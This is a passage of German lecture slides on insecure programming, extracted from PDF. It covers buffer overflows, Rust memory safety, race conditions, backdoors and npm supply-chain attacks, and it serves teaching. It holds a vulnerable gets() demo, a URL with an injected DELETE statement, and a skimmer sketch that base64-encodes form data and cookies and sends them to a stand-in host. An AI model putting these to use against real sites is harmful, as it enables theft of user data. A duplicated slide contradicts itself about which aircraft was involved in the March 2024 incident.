@@ -1,0 +1,2038 @@
+Grundlagen der IT-Sicherheit
+Kapitel 8 – (Un-) Sichere Programmierung
+
+Lehrstuhl: Data Privacy and Security,
+Center for Scalable Data Analytics and Artificial Intelligence
+Kontakt: buchmann@informatik.uni-leipzig.de
+
+Gliederung der Vorlesung
+▪
+
+Grundlagen der IT-Sicherheit
+−
+
+▪
+
+Anwendungsschicht
+−
+
+▪
+
+Krypto-Protokolle, Tracking, Browser-Sicherheit,
+sichere Programmierung
+
+Übertragungsschicht
+−
+
+▪
+
+Zugriffskontrolle, Verschlüsselung, Anonymisierung
+
+Firewalls, Angriffe auf die Infrastruktur, Netzwerkarchitekturen
+
+Management-Ebene
+−
+
+Basis-Absicherung und Security Engineering
+
+Prof. Buchmann - (In)Secure Programming
+
+2
+
+Lernziel und Aufbau dieses Kapitels
+▪
+
+Sicherheitsprobleme bei der Programmierung
+−
+−
+
+▪
+
+Gegenmaßnahmen
+−
+−
+−
+
+▪
+
+Buffer overflows, off-by-one Fehler, unsichere Übergabe von Daten
+Time-of-check vs. Time-of-use Fehler
+
+Gegenmaßnahmen, die nicht funktionieren
+Ansätze aus dem Software Engineering, Testen, Sicherheitsprinzipien
+OWASP Top-10
+
+Lernziele
+−
+−
+−
+
+Sie können fundiert erklären, auf welche Ursachen Sicherheitsprobleme
+bei der Programmierung im Allgemeinen zurückzuführen sind.
+Sie sind in der Lage, ausgewählte Sicherheitsprobleme zu erklären.
+Sie können Lösungsmöglichkeiten bewerten und einsetzen.
+Prof. Buchmann - (In)Secure Programming
+
+3
+
+Wie entstehen unsichere Programme?
+
+How it started
+
+Prof. Buchmann - (In)Secure Programming
+
+5
+
+How it is going
+
+Prof. Buchmann - (In)Secure Programming
+
+6
+
+Motivation
+▪
+
+Unsicherer Code: Enthält Schwachstellen, deren Ausnutzung
+Schäden verursachenkann
+−
+
+Es ist leicht, ein funktionierendes Programm zu schreiben von KI
+generieren zu lassen.
+
+−
+
+Es ist schwer fast unmöglich, ein nachweisbar sicheres funktionierendes
+Programm zu schreiben von KI generieren zu lassen.
+
+−
+
+Es ist unmöglich zu beweisen, dass ein (realistisches) Programm keine
+Schwachstellen aufweist.
+
+−
+
+Es ist noch viel unmöglicher zu beweisen, dass ein Programm innerhalb
+seines IT-Ökosystems (Betriebssytem, Treiber, Netzwerk-Setup,
+Zugriffsrechte, etc.) keine Schwachstellen aufweist.
+
+Prof. Buchmann - (In)Secure Programming
+
+7
+
+1. Mai 2017
+▪
+
+Intel macht AMT vulnerability (INTEL-SA-00075) öffentlich
+−
+
+Remote Management Konsole, Bug erlaubt Vollzugriff auf alles
+
+Prof. Buchmann - (In)Secure Programming
+
+9
+
+Umgehen der Authentifizierung möglich
+▪
+
+Problem: Eine einzige Codezeile wie diese hier:
+memcmp(entered_pwd, correct_pwd, entered_pwd_len);
+
+−
+
+Was passiert, wenn der Angreifer ein leeres Passwort schickt?
+
+Prof. Buchmann - (In)Secure Programming
+
+10
+
+Das Problem mit dem Software Engineering
+▪
+
+Alle Aspekte gleichzeitig optimieren bei begrenzten Ressourcen?
+(Geld, Zeit, Manpower)
+
+Resilience
+
+Customization
+
+Flexibility
+
+Functionality
+Costs
+
+Performance
+
+Usability
+Prof. Buchmann - (In)Secure Programming
+
+Security
+12
+
+Wie misst man Code-Qualität?
+
+Bild: Mikalai
+Alimenkou, 2010
+Prof. Buchmann - (In)Secure Programming
+
+13
+
+Technische Schulden
+▪
+
+Technische Schulden sind Kosten für die Nachbesserung, die bei
+einer „sauberen“ Entwicklung nicht angefallen wären
+
+▪
+
+absichtlich
+−
+−
+
+„Wir können die Deadline sonst nicht erreichen!“ (verzweifelte Situation)
+„Geschwindigkeit ist erst mal wichtiger!“ (Management-Entscheidung)
+→ Siehe Softwaretechnik: „Extreme Programming“
+
+▪
+
+unabsichtlich/ignorant
+−
+−
+−
+
+▪
+
+„Wozu den Entwicklungsprozess dokumentieren, das liest doch keiner!“
+„Vorgehensmodelle sind Quatsch!“
+„Wir haben das schon immer so gemacht!“
+
+Technische Schulden können zu immensen Kosten führen
+−
+
+Wenn Schnittstellen-Design oder Systemarchitektur unsicher ist,
+und eine Änderung das ganze Projekt betrifft
+Prof. Buchmann - (In)Secure Programming
+
+14
+
+Beispiel für technische Schulden
+▪
+
+Boeing 787 „Dreamliner“
+−
+−
+
+erste Auslieferung 26.10.2011
+zahllose Engineering-Probleme
+▪
+
+brennende Lithium-Ion-Akkus,
+Leckagen in der Hydraulik, Softwarequalität
+
+"erroneous low airspeed may be displayed..." (…) Pilots
+were told not to apply "large, abrupt control column inputs"
+in the event of an "unrealistic" drop in displayed airspeed
+(https://www.flightglobal.com, März 2016)
+−
+
+−
+−
+−
+
+2020: FAA fordert Rückruf von 900 Maschinen
+(ca. 1000 weltweit im Einsatz), schreibt
+das komplette neu booten alle 51 Tage vor
+2021: Boing stoppt Produktion, alle 787
+bleiben weltweit erst mal am Boden
+2022: FAA entzieht Boeing die Testerlaubnis,
+bis funktionierende Qualitätssicherung wiederhergestellt
+Aug. 2022: Boeing darf wieder Maschinen ausliefern
+(getestet durch die FAA, nicht mehr durch Boeing)
+
+−
+
+Mär. 2024: 737-MAXProf.
+verliert
+Kabinenwand
+wegen fehlender Bolzen
+Buchmann
+- (In)Secure Programming
+
+15
+
+Beispiel für technische Schulden
+▪
+
+Boeing 787 „Dreamliner“
+−
+−
+
+erste Auslieferung 26.10.2011
+zahllose Engineering-Probleme
+▪
+
+brennende Lithium-Ion-Akkus,
+Leckagen in der Hydraulik, Softwarequalität
+
+"erroneous low airspeed may be displayed..." (…) Pilots
+were told not to apply "large, abrupt control column inputs"
+in the event of an "unrealistic" drop in displayed airspeed
+(https://www.flightglobal.com, März 2016)
+−
+
+−
+−
+−
+
+2020: FAA fordert Rückruf von 900 Maschinen
+(ca. 1000 weltweit im Einsatz), schreibt
+das komplette neu booten alle 51 Tage vor
+2021: Boing stoppt Produktion, alle 787
+bleiben weltweit erst mal am Boden
+2022: FAA entzieht Boeing die Testerlaubnis,
+bis funktionierende Qualitätssicherung wiederhergestellt
+Aug. 2022: Boeing darf wieder Maschinen ausliefern
+(getestet durch die FAA, nicht mehr durch Boeing)
+
+−
+
+Mär. 2024: Dreamliner
+verliert- Kabinenwand
+wegen fehlender Bolzen
+Prof. Buchmann
+(In)Secure Programming
+
+16
+
+Buffer Overflows
+
+Motivation
+▪
+
+März 2019, British Airways Flug, Boeing 777-36N/ER
+
+▪
+
+Gelangweilter Cybersecurity-Spezialist schließt seine Maus an USBPort des Multimedia-Systems an seinem Sitz an – funktioniert. Klickt
+ein paar hundert Mal auf die eingeblendete virtuelle Tastatur
+
+Anwendung crasht mitten
+im Flug, kehrt zum
+Startbildschirm zurück und
+funktioniert nicht mehr.
+Zum Glück ist das
+Multimedia-System vom
+Flight Control System
+getrennt.
+Screenshot von https://www.youtube.com/watch?v=0xsmmiDLOGU
+Prof. Buchmann - (In)Secure Programming
+
+18
+
+Bedrohungsszenario "Buffer Overflow"
+▪
+
+Angenommen, ein erfahrener Hacker kennt die genaue Platzierung
+der Variablen und Adressen im Speicher
+−
+
+Speicherbereiche überschreiben
+▪
+
+−
+
+Umleitung der Ausführung
+▪
+
+−
+
+Programm verhält sich anders (Zugriff: verweigert → gestattet)
+
+Privilege escalation
+▪
+
+−
+
+Datenintegrität
+
+Buffer overflow führt dazu, dass Code ausgeführt wird, der mit den aktuellen
+Benutzerrechten nicht hätte ausgeführt werden dürfen
+
+System Crash
+▪
+▪
+
+Ausführungsumgebung entdeckt Fehler im Programm und stoppt es
+Ausführungsumgebung selbst enthält den Fehler, Bluescreen of Death ;-)
+
+Prof. Buchmann - (In)Secure Programming
+
+19
+
+▪
+
+Buffer: Reservierter Speicherbereich
+mit vom Programm vor Benutzung
+festgelegter Größe
+
+▪
+
+Pufferüberlauf: einer der bekanntesten
+und ältesten Programmierfehler
+
+▪
+
+Beispiel für einen Buffer Overflow:
+char buf[10] = {0};
+strcpy(buf, "This string will
+exceed the buffer!");
+
+→ Was bei der Ausführung passiert,
+hängt von der Position im Puffer ab
+▪
+▪
+
+Reserved (virtual) address space for a program
+
+Buffer Overflows
+
+Stack
+- Return addresses
+- Return values
+- Method parameters
+- Method variables
+
+Heap
+- Arrays
+- Structures
+- Large data objects
+Static data structures
+Code
+
+Nichts zu bemerken
+Programm zeigt anderes Verhalten/crasht
+Prof. Buchmann - (In)Secure Programming
+
+20
+
+Wenn Sie‘s selber ausprobieren wollen
+▪
+
+Code
+#include <stdio.h>
+int main(int argc, char **argv)
+{
+char buf[8];
+// Puffer für 8 char-Werte
+gets(buf);
+// Lesen vom stdio
+printf("%s\n", buf); // Pufferinhalt auf Kommandozeile ausgeben
+return 0;
+}
+
+▪
+
+Ausführung auf der Kommandozeile
+./test
+1234
+1234
+
+// Start des Programms
+// "1234" über die Tastatur eingegeben
+// Programm schreibt auf die Kommandozeile
+
+./test
+// Start des Programms
+123456789012 // "123456789012" über die Tastatur eingegeben
+123456789012 // Wieso kann das Programm 12 Zeichen
+aus einem Puffer von 8 Zeichen ausgegeben?
+Segmentation fault
+// Betriebssystem erzwingt Stopp des Programms
+Prof. Buchmann - (In)Secure Programming
+
+21
+
+▪
+
+Programme, Integer, Strings, Zeiger etc.
+sind im Speicher nur Bits und Bytes
+
+▪
+
+Es hängt vom Zustand der CPU-Register
+ab, ob Datenwort (8, 16, 32, 64, … Bit)
+im Speicher
+−
+−
+
+−
+
+als Instruktion interpretiert und
+ausgeführt wird
+als Zeiger auf eine Sprungadresse
+interpretiert und das Programm an
+jener Stelle fortgesetzt wird
+als Daten interpretiert und für
+Berechnungen eingesetzt wird
+
+Reserved (virtual) address space for a program
+
+Speicher, Code und Daten (1/2)
+
+Stack
+- Return addresses
+- Return values
+- Method parameters
+- Method variables
+
+Heap
+- Arrays
+- Structures
+- Large data objects
+Static data structures
+Code
+
+Anm.: Physische Adressen werden vom Betriebssystem
+verwaltet, hier nur logische Adressierung.
+
+Prof. Buchmann - (In)Secure Programming
+
+22
+
+▪
+
+Stack
+−
+−
+−
+
+▪
+
+Heap
+−
+−
+−
+
+▪
+
+kleiner Last-in-first-out Speicher
+Variablen, die innerhalb einer
+Methode gültig sind
+CPU-Register und Rücksprungadressen beim Aufruf von Methoden
+
+sehr großer Speicherbereich
+globale Daten, die länger gültig sind
+Speicher explizit anfordern/freigeben
+
+Reserved (virtual) address space for a program
+
+Speicher, Code und Daten (2/2)
+
+Wenn durch einen Puffer Overflow eine
+Rücksprungadresse verändert wird,
+kann etwas Unbeabsichtigtes passieren!
+Prof. Buchmann - (In)Secure Programming
+
+Stack
+- Return addresses
+- Return values
+- Method parameters
+- Method variables
+
+Heap
+- Arrays
+- Structures
+- Large data objects
+Static data structures
+Code
+
+23
+
+Anatomie eines Buffer Overflows
+▪
+
+Beispielcode
+...
+09:
+10: char buf[10];
+11: read_data(buf, input);
+12: exit;
+
+▪
+
+Erläuterung
+
+CPU registers
+
+← Stack Pointer
+(SP)
+
+buf[9]
+buf[8]
+buf[7]
+
+10: Reserviere 10 Bytes auf Stack
+−
+
+Stack
+Return address: 11
+
+setze SP 10 Bytes weiter
+
+…
+buf[0]
+
+11: Aufruf von read_data()
+−
+−
+−
+
+CPU-Register auf Stack legen, SP weitersetzen
+Was passiert,
+Rücksprungadresse auf Stack legen, SP weitersetzen
+wenn input mehr
+read_data():
+als 10 Bytes hat?
+▪ Schreibe alle Daten aus input in buf
+▪ Hole Rücksprungadresse, CPU-Register vom Stack, SP zurücksetzen
+▪ Setze Programmausführung an Rücksprungadresse fort
+
+12: Programm Ende
+Prof. Buchmann - (In)Secure Programming
+
+24
+
+Bild: Wikimedia
+
+Schutz gegen Buffer Overflows (1/3)
+▪
+
+Auf CPU- und Betriebssystem-Ebene
+−
+
+Falsche Adresse im Program Counter-Register der CPU bringt das
+Betriebssystem dazu, das Programm abzubrechen
+Falsche Adresse: keine gültige Instruktion, kein
+existierender Speicherbereich, etc.
+
+Ring 3
+
+„Protected Mode“ (x86) beschränkt Ausführbarkeit
+
+Ring 1
+
+▪
+
+−
+
+▪
+▪
+
+−
+
+NX-Flag (NoeXecution) auf Speicherbereiche
+CPU kennt „Rings“ mit unterschiedlichen Privilegien
+– Ring 0: Kernel,
+Ring 1, 2: Treiber,
+Ring 3: Anwendungsprogramme
+– Programm auf Ring 3 kann nicht auf
+Speicherbereich eines Programms auf Ring < 3 zugreifen
+
+Ring 2
+
+Least
+
+Ring 0
+Kernel
+
+Device drivers
+
+Most
+
+Device drivers
+Applications
+
+Betriebssystem-Virtualisierung isoliert
+Programme im selben Ring voneinander
+▪
+
+Jedenfalls solange die Virtualisierung keinen breakout erlaubt
+
+Prof. Buchmann - (In)Secure Programming
+
+25
+
+Schutz gegen Buffer Overflows (2/3)
+▪
+
+Moderne Programmiersprachen
+−
+
+Rust, Java, C# im „safe“-Kontext
+▪
+▪
+
+▪
+
+Keine Pointer, keinen direkten Zugriff auf buffer
+(Zugriff realisiert über Methoden, die Puffergrenzen jedesmal prüfen)
+System-Puffer werden überwacht
+(java.lang.StackOverflowError)
+
+Moderne Compiler können
+buffer-Grenzen überwachen
+−
+−
+−
+−
+
+C, C++ Compiler speichert "Stack canary"
+auf dem Stack (gcc -fstack-protector ...)
+Stack canary ist ein Hilfswert, den
+der Angreifer nicht vorhersagen kann
+Buffer Overflow überschreibt Stack canary
+Geänderter Wert: Programm abbrechen
+
+Stack
+Return address
+CPU registers
+Stack canary
+buf[9]
+buf[8]
+buf[7]
+…
+buf[0]
+
+Prof. Buchmann - (In)Secure Programming
+
+26
+
+Schutz gegen Buffer Overflows (3/3)
+▪
+
+Code Analyzer suchen nach unsicherem Code
+−
+−
+
+▪
+
+Weisen Programmierer auf Schwachstellen hin, z.B. fehlenden Code zur
+Prüfung der Pufferlänge
+Lassen sich in Compiler integrieren, siehe GCC
+
+Sichere Systembibliotheken bieten nur sichere Funktionen an
+−
+
+−
+
+Eine Methode
+strcpy(char *dest, char *src);
+die die Pufferlänge nicht überprüft, sollte nicht existieren
+Sinnvoller ist so eine Methode
+strncpy(char *dest, char *src, int num_bytes);
+
+Prof. Buchmann - (In)Secure Programming
+
+27
+
+Sicherheit in Programmiersprachen
+●
+
+am Beispiel von Rust
+(Folien mit freundlicher Unterstützung
+von Jakob Lambert-Hartmann)
+
+Lässt sich die Sicherheit von Programmen durch die
+Programmiersprache erzwingen?
+▪
+
+Ja
+−
+−
+
+▪
+
+Nein
+−
+
+−
+
+▪
+
+Wenn kein Sprachkonstrukt existiert,
+das beispielsweise Zugriffe auf nicht existierende Speicher ermöglicht
+Wenn die Sprache den Programmierer zwingt,
+beispielsweise Variablen vor der ersten Nutzung zu initialisieren oder
+alle Funktionsaufrufe mit einem definierten Statuscode zu beenden
+Wenn die Business Logic fehlerhaft ist,
+beispielsweise indem Daten ungeprüft in eine Datei geschrieben werden
+oder Backdoors im Code existieren
+Wenn externen Faktoren zu unvorhersagbaren Zuständen führen,
+siehe "Race Conditions" im nächsten Abschnitt
+
+Im folgenden: Speichermanagement und Exception Handling
+
+Prof. Buchmann - (In)Secure Programming
+
+29
+
+Manuelles Speichermanagement
+▪
+
+Speicher allokieren und Pointer darauf speichern (C, C++)
+
+▪
+
+Sehr effizient, aber viele mögliche Programmierfehler
+−
+−
+−
+−
+−
+
+Inhalt vom allokierten data-Speicherbereich undefiniert
+Buffer Overflow, wenn mehr als sizeof(DataType) geschrieben wird
+Memory Leaks, wenn der letzte Thread das free() vergisst
+Use After Free, wenn ein Thread free() aufruft und ein anderer data nutzt
+Double Free, wenn mehrere Threads free() aufrufen
+(undefiniertes Verhalten)
+
+Prof. Buchmann - (In)Secure Programming
+
+30
+
+Speichermanagement mit Garbage Collector (1/2)
+▪
+
+new(DataObject) erzeugt neues Datenobjekt (Java, Python, JS etc.)
+
+▪
+
+Garbage Collector sucht periodisch nach Referenzen auf DataObject,
+ruft selber free(DataObject) auf, wenn keine Referenz existiert
+
+▪
+
+Keine fehlerträchtige Speicherverwaltung durch Programmierer
+
+▪
+
+Aber: Garbage Collector ist ineffizient und mögliche Fehlerquelle
+Prof. Buchmann - (In)Secure Programming
+
+31
+
+Speichermanagement mit Garbage Collector (2/2)
+▪
+
+Programmierfehler sind leicht möglich
+
+▪
+
+Fehlerquelle Programmierer
+−
+−
+−
+
+Liste l speichert 3x "hello": 2x dasselbe Objekt, 1x ein Clon davon
+Zwei Threads arbeiten mit demselben "hello" wie 2x in der Liste
+Wenn einer der Threads s ändert, ändern sich die ersten zwei StringObjekte in der Liste und der an den anderen Thread übergebene String
+
+Prof. Buchmann - (In)Secure Programming
+
+32
+
+Speichermanagement durch Ownership
+▪
+
+Die Speicherstruktur verwaltet sich selbst (Rust)
+−
+
+Jedes Datenobjekt hat einen Owner
+
+(Owner: die Funktion, die das Datenobjekt nutzen darf)
+−
+−
+
+Es kann nur einen Owner geben
+Wenn der Owner nicht mehr existiert, wird der Speicher freigegeben
+(z.B. beim Rücksprung aus einer Funktion, die der Owner war)
+
+Prof. Buchmann - (In)Secure Programming
+
+33
+
+Ownership: Repräsentation im Speicher (Rust)
+▪
+
+Stack:
+−
+
+▪
+
+len, capacity, ptr
+Stack
+
+Heap
+−
+
+String data
+
+▪
+
+Ownership implizit dadurch, dass
+der Stack-Bereich zu einem
+Unterprogramm gehört
+
+▪
+
+Verwaltung ohne Garbage Collector:
+Wenn s1 auf dem Stack ungültig,
+(d.h. Rücksprung aus dem
+Unterprogramm mittels
+Rücksprungadresse vom Stack)
+
+Heap
+
+wird der Heap einfach mit freigegben
+Prof. Buchmann - (In)Secure Programming
+
+34
+
+Und wenn zwei Variablen dieselben Daten nutzen? (1/2)
+
+So machen es andere Programmiersprachen
+▪
+
+Variante 1: Shallow Copy
+−
+−
+−
+
+▪
+
+Nur der Zeiger wird kopiert
+Heap-Daten unverändert
+Schnell, aber schwierig herauszufinden
+ob free() erforderlich oder nicht
+
+Variante 2: Deep Copy (Cloning)
+−
+−
+
+Neue Struktur auf dem Stack,
+Heap-Daten werden kopiert
+Langsam und speicheraufwändig, aber
+jede Kopie kann mit free() unabhängig
+von anderen freigegeben werden
+
+Prof. Buchmann - (In)Secure Programming
+
+35
+
+Und wenn zwei Variablen dieselben Daten nutzen? (2/2)
+
+So macht es Rust
+▪
+
+Move Ownership
+−
+
+▪
+
+Ursprüngliche Struktur auf dem Stack wird
+ungültig, Heap-Struktur bleibt wie sie ist
+
+Nach dem Ausführen des Codes oben:
+
+Prof. Buchmann - (In)Secure Programming
+
+36
+
+Programmierer muss sich explizit um Gültigkeit kümmern
+▪
+
+compute_length hat Ownership, Zeile 15 kompiliert nicht
+
+Prof. Buchmann - (In)Secure Programming
+
+37
+
+Programmierer muss sich explizit um Gültigkeit kümmern
+▪
+
+compute_length gibt Ownership zurück, Zeile 15 kompiliert
+
+Prof. Buchmann - (In)Secure Programming
+
+38
+
+Manuelles Error Handling
+▪
+
+Beispiele in C:
+−
+
+Zugriff auf nicht allokierten Speicher
+(el bekommt undefinierten Inhalt)
+
+−
+
+Aufruf einer Funktion schlägt fehl
+(Nicht die Programmiersprache definiert, was jetzt in f steht, sondern die Bibliothek
+z.B. fopen() gibt NULL bei Fehler zurück, system() gibt 0 bei Erfolg zurück)
+
+−
+
+Ungültige Arithmetik
+
+(Wert von c undefiniert, Programmierer muss daran denken, diesen Fall zu prüfen)
+
+Prof. Buchmann - (In)Secure Programming
+
+39
+
+Java-style Error Handling
+▪
+
+Exception-Handling
+−
+
+checked exceptions deren Vorhandensein der Compiler prüft
+(d.h., der Programmierer MUSS daran denken)
+▪
+▪
+▪
+
+−
+
+FileNotFoundException des Dateisystems
+IOException des IO-Subsystems
+SQLException des JDBC-Treibers
+
+Hier liegt das
+Problem
+
+unchecked exceptions zur Laufzeit
+
+(d.h., der Programmierer DARF daran denken)
+▪
+▪
+▪
+
+▪
+
+NullPointerException bei Zugriff auf ein Null-Objekt
+StackOverflowException bei Überschreiten der Stacksize
+ArithmeticException bei Division durch 0
+
+Fehlerquellen
+−
+−
+
+Zur Compile-Time beispielsweise nicht prüfbar, ob ein Objekt NULL ist
+Programmierer kommt damit durch, einen try{} catch() Block um alles zu
+definieren oder Laufzeitfehler zu ignorieren, bis einer tatsächlich auftritt
+Prof. Buchmann - (In)Secure Programming
+
+40
+
+Error Handling in Rust
+▪
+
+Rust-Spezifikation ist vollständig
+(undefinierter Zustand unmöglich, d.h., panic!() terminiert Programm bei Division / 0)
+
+▪
+
+Ownership macht viele Laufzeitfehler zu Compile-Time Fehlern
+(d.h., lassen sich VOR Programmausführung erkennen!)
+
+▪
+
+Keine impliziten NULL-Werte in Rust machen ebenfalls aus vielen
+Laufzeitfehlern Compile-Time Fehler
+−
+
+Wenn eine Anwendung NULL-Werte für "Daten nicht vorhanden"
+braucht, muss dies explizit über enum Option programmiert werden
+
+Prof. Buchmann - (In)Secure Programming
+
+41
+
+Beispiel für expliziten NULL-Wert
+▪
+
+get_some_string()
+gibt entweder einen
+String in Some
+zurück, oder
+modelliert NULL-Wert
+als None
+
+▪
+
+Fallweise wird der
+eine oder der andere
+Code ausgeführt
+
+Prof. Buchmann - (In)Secure Programming
+
+42
+
+Exception-Handling von Funktionsaufrufen
+▪
+
+Definierte Schnittstelle in Rust
+
+−
+
+Exception-Handling ist von der Programmiersprache definiert
+▪
+
+−
+
+Bibliothek definiert nur die Semantik der Ok- und Err-Codes
+
+Abarbeitung nach Function Calls ebenso wie bei enum Option
+
+Prof. Buchmann - (In)Secure Programming
+
+43
+
+Insecure Mediation:
+Fehler in der Business Logic
+●
+
+Daten, Parameter für Programme
+
+●
+
+Ablaufsteuerung in Programmen
+
+●
+
+Kontext zwischen Prozessen
+
+Motivation
+▪
+
+Sie sehen so einen Link auf einen Web-Shop:
+http://www.myshop.de/?account=12345
+
+▪
+
+Was passiert, wenn Sie den Link ändern?
+http://www.myshop.de/?account=12346
+http://www.myshop.de/?account=-12345
+http://www.myshop.de/?account=ABCD
+http://www.myshop.de/?account=12345678912345678912
+34567891234567891234567891234567891234567891234567
+89123456789123456789123456789123456789123456789123
+45678912345678912345678912345678912345678912345678
+http://www.shop.de/?account=‘12345;DELETE *;‘
+Prof. Buchmann - (In)Secure Programming
+
+45
+
+Was kann passieren?
+▪
+
+Sie bekommen Zugriff auf einen fremden Account
+
+▪
+
+Sie haben den Web-Shop gecrasht
+
+▪
+
+Der Web-Shop arbeitet nun mit falschen Daten weiter
+
+→ im Folgenden: Probleme bei der Übergabe der Kontrolle/Daten
+von einem Prozess/Programm/Benutzer an einen anderen
+
+Prof. Buchmann - (In)Secure Programming
+
+46
+
+Undokumentierter Zugang
+▪
+
+Typischer Fall
+−
+−
+−
+
+▪
+
+Programmierer will die Programmausführung überwachen
+fügt Methoden zum Zugriff/Tracken des Programmablaufs hinzu
+„vergisst“ diese Methoden beim Ausliefern an den Kunden zu entfernen
+→ „Backdoor“
+
+Backdoors werden letztendlich immer gefunden
+−
+
+Sicherheit darf nicht von Geheimhaltung des Codes abhängen!
+(Siehe Kryptographie-Kapitel)
+
+−
+
+Im Zweifel ist es ein gekündigter/unzufriedener Programmierer
+
+Wer von Ihnen weiß noch, was idkfa bedeutet? ;-)
+
+Prof. Buchmann - (In)Secure Programming
+
+47
+
+Time-of-check vs. Time-of-use
+Access Control ist fundamental wichtig!
+
+▪
+
+Daten können eine (längere) Zeitspanne genutzt werden,
+Prozesse können eine (längere) Zeitspanne laufen
+
+▪
+
+Zeit zwischen Zugriffskontrolle und Nutzung ist ein Problem
+
+▪
+
+Beispiel:
+
+Time
+
+▪
+
+Alice
+- get read access to account table
+- calculate the average of all accounts
+- get write access to accounts table
+- +10% to all accounts below average
+
+Bob
+- get write access to account table
+- insert a new account with value 10,000
+
+Prof. Buchmann - (In)Secure Programming
+
+48
+
+Race Condition
+▪
+
+Race conditions sind Fehler bei der Ausführung von zwei oder mehr
+unabhängigen Prozessen
+−
+−
+−
+
+▪
+
+Reihenfolge und Timing der Prozesse entscheiden über Korrektheit
+Programm funktioniert im Einzelnutzerbetrieb, aber Schwachstellen
+führen zu unerwünschtem Verhalten im Mehrbenutzerbetrieb
+Schwachstellen sehr schwer zu finden
+
+Beispiel: Online-Termin im Bürgerbüro
+−
+−
+−
+−
+−
+
+Suche nach freien Terminen,
+Entscheidung für einen Termin
+Name, Adresse eingeben,
+Datenschutzerklärung bestätigen
+Klick auf den "Buchen"-Button
+Was passiert, wenn das
+mehrere Nutzer gleichzeitig tun?
+Prof. Buchmann - (In)Secure Programming
+
+49
+
+Sicherheitsproblem Race Condition
+Fehlerhafter Ablauf ist klar, aber ist das ein Sicherheitsproblem?
+▪
+
+Beispiel Tripwire (Intrusion Detection, Version von 2001)
+
+1) Angreifer weiß, dass Prozess mit Systemrechten Tripwire ausführt
+und dazu eine temporäre
+Datei anlegt.
+2) Angreifer wartet Start
+des Systemprozesses ab,
+erzeugt dann Symlink mit
+Namen der temp. Datei hin
+zu einer existierenden Datei
+3) Datei existiert nicht beim
+Check durch Tripwire,
+wird später mit Systemrechten überschrieben
+Prof. Buchmann - (In)Secure Programming
+
+Anm.: Mittlerweile verhindert
+Betriebssystem so etwas
+50
+
+Unsichere Software-Ökosysteme:
+Angriffe über die Software Supply Chain
+
+Motivation
+▪
+
+Dezember 2020: Cybersicherheitsfirma
+Fireeye bemerkt Hackerangriff im System
+−
+
+Nachforschung zeigt: Angreifer ist im
+März (!!!) 2020 in einen Server der
+Firma SolarWinds eingedrungen
+▪
+▪
+
+Passwort des Servers: „solarwinds123“
+Passwort war auf Github eingecheckt und damit öffentlich sichtbar
+
+−
+
+Manipulierter Code in Servermanagement-Software „SolarWinds Orion“
+
+−
+
+Per Update bekamen alle Orion-Nutzer manipulierte DLL mit Backdoor
+▪
+
+−
+
+Update von SolarWinds korrekt digital signiert
+
+Orion läuft mit System-Privilegien in Großunternehmen
+▪
+▪
+
+Zahllose Betroffene: Cisco, Dow Chemical, Lockheed Martin, MasterCard,
+Microsoft, NASA, Pentagon, Siemens, auch viele deutsche Behörden
+(bis jetzt) erfolgreichster Datendiebstahl aller Zeiten
+Prof. Buchmann - (In)Secure Programming
+
+54
+
+Aus einem Vortrag von Prof. Dr. Martin Johns:
+
+Prof. Buchmann - (In)Secure Programming
+
+55
+
+„Harvesting“ von sensitiven Daten vieler Nutzer
+
+Natürliche
+Ursache
+Feuer, Stromausfall
+Überschwemmung
+
+Bedrohung
+
+Menschliche
+Ursache
+
+Gute
+Absichten
+
+Menschliches
+Versagen
+
+Schlechte
+Absichten
+
+Zufällig
+Schadcode auf
+einer Webseite
+
+Gezielt
+Personalisierter
+Schadcode an eine
+Email-Adresse
+
+Wir sind hier
+
+Prof. Buchmann - (In)Secure Programming
+
+56
+
+Komplexe Software-Ökosysteme
+▪
+
+Software als Zusammenspiel von unterschiedlichen Organisationen,
+die unterschiedliche Software-Komponenten liefern
+−
+−
+−
+−
+−
+
+Betriebssystem
+Treiber
+Bibliotheken
+Anwendungsprogramme
+Virtualisierung / Hypervisor
+
+▪
+
+Jede Organisation mit eigener Entwicklung, eigener
+Qualitätssicherung, eigener Update-Policy, eigener
+Sicherheitsrichtlinie, ...
+
+▪
+
+Wie gut lässt sich ein System sichern/testen,
+bei dem der größte Teil des Codes von
+Externen entwickelt und geupdated wird?
+Prof. Buchmann - (In)Secure Programming
+
+57
+
+Probleme durch (unnötige) Komplexität
+
+(Nochmal von Prof. Dr. Martin Johns)
+Prof. Buchmann - (In)Secure Programming
+
+58
+
+Wie läuft ein Angriff auf Software Ökosysteme?
+▪
+
+Beispiel: Node.js
+−
+−
+−
+
+Open Source, plattformübergreifende JavaScript-Laufzeitumgebung zur
+serverseitigen Ausführung von JavaScript-Code
+Einfache Entwicklung von dynamischen Webseiten und Web-Apps
+Paketverwaltung „npm“ ermöglicht Veröffentlichung und gemeinsame
+Nutzung des Quellcodes von Node.js-Bibliotheken
+→ Komplexes Open-Source-Ökosystem
+▪
+▪
+▪
+▪
+
+>2,1 Mio. vorkompilierte npm-Pakete (Stand: Sept. 2022)
+npm berücksichtigt Abhängigkeiten zwischen Paketen
+Updates werden automatisch installiert
+npm-Pakete werden von der Open-Source-Community validiert
+
+Prof. Buchmann - (In)Secure Programming
+
+59
+
+Sicherheitsprozess Node.js
+
+Prof. Buchmann - (In)Secure Programming
+
+60
+
+Angriffe über Third-Party-Module?
+▪
+
+Beispiel: Schadcode in möglichst viele Web-Apps einbetten,
+die Node.js mit npm-Pakten verwenden
+−
+
+▪
+
+https://blog.sqreen.com/one-easy-way-to-inject-maliciouscode-in-any-node-js-application/
+
+Schadcode könnte folgendes leisten:
+−
+
+Alle auf der Webseite in Formulare eingegebenen Daten mitlesen
+document.forms.forEach(…)
+
+−
+−
+
+Das Cookie aus document.cookie kopieren
+Alle mitgelesenen Daten in eine unverdächtige Zeichenkette kodieren
+const payload = btoa(JSON.stringify(sensitiveUserData))
+
+−
+−
+
+▪
+
+Alle gesammelten Daten an eine unverdächtige Adresse schicken
+https://fairytale-analytics.com?q=${payload}
+...
+
+Wie bekommt der Angreifer den Schadcode auf viele Webseiten?
+Prof. Buchmann - (In)Secure Programming
+
+61
+
+Angriff auf das NPM-Paketmanagement (1/3)
+▪
+
+Angreifer entwickelt eine Package, die viele andere verwenden
+−
+
+▪
+
+z.B. eine farbige Log-Konsole
+
+Alternativ: Angreifer sucht eine beliebte Package, deren Maintainer
+keine Lust mehr hat und die Ownership übertragen möchte
+
+Prof. Buchmann - (In)Secure Programming
+
+62
+
+Angriff auf das NPM-Paketmanagement (2/3)
+1) Angreifer macht die eigene Package bekannt
+−
+
+“Hey community, I’ve created a package for colored logging!”
+
